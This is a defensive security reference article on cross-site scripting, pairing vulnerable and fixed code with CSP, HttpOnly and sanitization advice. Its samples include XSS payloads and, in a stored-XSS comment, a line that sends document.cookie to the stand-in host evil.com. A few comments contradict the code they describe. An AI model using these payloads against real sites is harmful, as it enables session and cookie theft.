---
title: XSS
title_pt: XSS (Cross-Site Scripting)
layer: security
type: vulnerability
priority: high
version: 1.0.0
tags:
  - Security
  - XSS
  - Vulnerability
description: Vulnerability that allows attackers to inject malicious scripts into web pages.
description_pt: Vulnerabilidade que permite atacantes injetarem scripts maliciosos em páginas web.
prerequisites: []
estimated_read_time: 10 min
difficulty: intermediate
---

# XSS

## Description

Cross-Site Scripting (XSS) is a client-side code injection attack that targets applications by embedding malicious scripts in web pages viewed by other users. When successful, the attacker's script executes in the victim's browser, allowing them to steal session cookies, bypass authentication, deface websites, or redirect users to malicious pages.

XSS vulnerabilities occur when applications include untrusted data in web pages without proper validation or escaping. The browser cannot distinguish between legitimate script content and malicious scripts embedded by attackers, leading to execution of the attacker's code.

There are three main types of XSS:
1. **Reflected XSS**: The malicious script is part of the request sent to the web server and is reflected back in the response
2. **Stored XSS**: The malicious script is stored on the target server and served to users later
3. **DOM-based XSS**: The vulnerability exists in client-side code rather than server-side code

XSS is one of the most common web application vulnerabilities and consistently appears in the OWASP Top 10. The impact of XSS can range from minor annoyances to severe security breaches, depending on the sensitivity of the data accessible to the injected scripts.

## Purpose

**When XSS testing is valuable:**
- In all web applications that accept user input
- When displaying user-generated content
- In applications using JavaScript frameworks
- For applications with authentication

**When XSS is most critical:**
- Applications with sensitive user data
- Financial applications
- Applications with session-based authentication
- Admin panels and management interfaces

## Rules

1. **Escape untrusted data** - Never output user input without escaping
2. **Validate input** - Accept only expected formats
3. **Use Content Security Policy** - Define allowed script sources
4. **Set HttpOnly cookies** - Prevent JavaScript access to session cookies
5. **Use modern frameworks** - Most frameworks auto-escape by default
6. **Encode for context** - Different contexts need different encoding
7. **Test with XSS payloads** - Include XSS in security testing

## Examples

### Reflected XSS

```html
<!-- VULNERABLE: Server reflects user input without encoding -->
<!-- URL: https://example.com/search?q=test -->
<p>You searched for: test</p>

<!-- If q=<script>alert('xss')</script> -->
<p>You searched for: <script>alert('xss')</script></p>

<!-- SECURE: Encode output -->
<p>You searched for: &lt;script&gt;alert('xss')&lt;/script&gt;</p>
```

```python
# VULNERABLE: Flask reflect user input
@app.route('/search')
def search():
    query = request.args.get('q', '')
    return f'<p>You searched for: {query}</p>'

# SECURE: HTML escape user input
import html

@app.route('/search')
def search():
    query = request.args.get('q', '')
    escaped_query = html.escape(query)
    return f'<p>You searched for: {escaped_query}</p>'
```

### Stored XSS

```javascript
// VULNERABLE: Storing user comment without sanitization
app.post('/comments', (req, res) => {
  const comment = req.body.comment;
  
  // Store directly in database
  db.query('INSERT INTO comments (comment) VALUES (?)', [comment]);
  
  // When displayed, XSS executes
  // <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
});

// SECURE: Sanitize before storing
const DOMPurify = require('dompurify');

app.post('/comments', (req, res) => {
  const comment = req.body.comment;
  
  // Sanitize on output, not storage
  const clean = DOMPurify.sanitize(comment);
  
  db.query('INSERT INTO comments (comment) VALUES (?)', [clean]);
});
```

### DOM-based XSS

```javascript
// VULNERABLE: Reading from URL and inserting into DOM
// URL: https://example.com/#name=<img src=x onerror=alert(1)>
const params = new URLSearchParams(window.location.hash.slice(1));
const name = params.get('name');

document.getElementById('welcome').innerHTML = `Welcome, ${name}`;

// SECURE: Use textContent instead of innerHTML
const params = new URLSearchParams(window.location.hash.slice(1));
const name = params.get('name');

document.getElementById('welcome').textContent = `Welcome, ${name}`;
```

## Anti-Patterns

### 1. Incomplete Input Validation

**Bad:**
- Only checking for <script> tags
- Blacklisting instead of whitelisting
- Not considering all injection vectors

**Solution:**
- Use comprehensive sanitization libraries
- Whitelist valid input patterns
- Test with various payloads

### 2. Trusting Client-Side Validation

**Bad:**
- Validating input only in JavaScript
- Not re-validating on server
- Client-side validation can be bypassed

**Solution:**
- Always validate on server
- Use server-side sanitization libraries
- Don't rely on client-side alone

### 3. Using innerHTML

**Bad:**
- Using innerHTML to display user data
- Directly inserting user input into DOM
- Not considering XSS in modern frameworks

**Solution:**
- Use textContent or innerText
- Use framework's auto-escaping
- Be careful with dangerouslySetInnerHTML

## Best Practices

### 1. Content Security Policy

```html
<!-- Set CSP header to limit script execution -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self'; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' data:;">
```

```javascript
// Set CSP via headers (Express)
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://trusted.cdn.com;"
  );
  next();
});
```

### 2. Framework-Safe Rendering

```jsx
// React: Automatically escapes by default
function UserDisplay({ user }) {
  // Safe - React escapes automatically
  return <div>{user.name}</div>;
}

// DANGEROUS: Bypass escaping
function UserDisplay({ user }) {
  // Never do this!
  return <div dangerouslySetInnerHTML={{__html: user.name}} />;
}
```

### 3. Template Engines

```html
<!-- Handlebars: Auto-escapes by default -->
{{userInput}}  <!-- Safe -->

<!-- Must explicitly mark as raw for unescaped -->
{{{userInput}}}  <!-- Dangerous - only if you must! -->
```

```django
<!-- Jinja2: Must use |escape filter -->
{{ user_input }}  <!-- Safe -->
{{ user_input | safe }}  <!-- Dangerous -->

<!-- Or disable autoescape explicitly -->
{% autoescape false %}
  {{ user_input }}
{% endautoescape %}
```

### 4. HTTP-only Cookies

```javascript
// Set HttpOnly and Secure flags
app.use(session({
  secret: 'your-secret-key',
  cookie: {
    httpOnly: true,    // Prevents JavaScript access
    secure: true,      // HTTPS only
    sameSite: 'strict' // CSRF protection
  }
}));
```

## Failure Modes

- **Unescaped user input in HTML output** → user input rendered as HTML → malicious script execution in victim browser → escape all untrusted data before rendering in HTML context
- **Using innerHTML with user data** → direct DOM insertion of user content → DOM-based XSS → use textContent or framework auto-escaping instead of innerHTML
- **Incomplete input sanitization** → only blocking script tags → attacker uses img, svg, or event handlers → use comprehensive sanitization libraries that handle all XSS vectors
- **Trusting client-side validation only** → server does not re-validate → attacker bypasses client checks → always validate and sanitize input on server side
- **Missing Content Security Policy** → no restriction on script sources → any script can execute → implement CSP with strict script-src directives and avoid unsafe-inline
- **XSS in modern frameworks via dangerous APIs** → using dangerouslySetInnerHTML or v-html → framework auto-escaping bypassed → avoid dangerous rendering APIs and use safe alternatives
- **Stored XSS from user-generated content** → malicious content saved to database → all users who view content are affected → sanitize content before storage and escape on output

## Technology Stack

| Tool | Type | Use Case |
|------|------|----------|
| DOMPurify | Library | HTML sanitization |
| OWASP Java Encoder | Library | Java encoding |
| htmlentities | Library | PHP encoding |
| ESLint plugin | Linter | Detect XSS in JS |
| Burp Suite | Scanner | Find XSS vulnerabilities |
| OWASP ZAP | Scanner | Automated XSS testing |

## Related Topics

- [[InputValidation]]
- [[SecurityHeaders]]
- [[CSRF]]
- [[SQLInjection]]
- [[Authentication]]
- [[HTTPS]]
- [[TlsSsl]]
- [[APIDesign]]

## Key Takeaways

- XSS injects malicious scripts into web pages viewed by other users through unescaped untrusted data, enabling session hijacking, data theft, and account takeover
- Testing is valuable in all web applications accepting user input, when displaying user-generated content, and for applications with authentication
- Critical for applications with sensitive user data, financial applications, session-based auth, and admin interfaces
- Tradeoff: output encoding and input sanitization overhead versus risk of script execution in victim browsers
- Main failure mode: rendering unescaped user input as HTML allows attackers to execute arbitrary JavaScript in other users' browsers
- Best practice: escape all untrusted data before rendering, use framework auto-escaping (React, Vue, Angular), avoid innerHTML and dangerous APIs like dangerouslySetInnerHTML, implement Content Security Policy with strict script-src, use HttpOnly cookies to protect session tokens, and sanitize user-generated content before storage
- Related: input validation, security headers, CSRF, SQL injection, authentication, HTTPS, TLS/SSL, API design

## Additional Notes

**XSS Impact Levels:**
- Low: Defacement, annoyance
- Medium: Session hijacking, cookie theft
- High: Account takeover, data exfiltration
- Critical: Full application compromise

**Testing XSS:**
- Test with various payloads
- Test in all contexts (HTML, JS, CSS, URL)
- Test with different encoding
- Use automated scanners

**Modern Frameworks:**
- React, Vue, Angular auto-escape by default
- Still vulnerable with: dangerouslySetInnerHTML, v-html, innerHTML
- SPA routing can have DOM XSS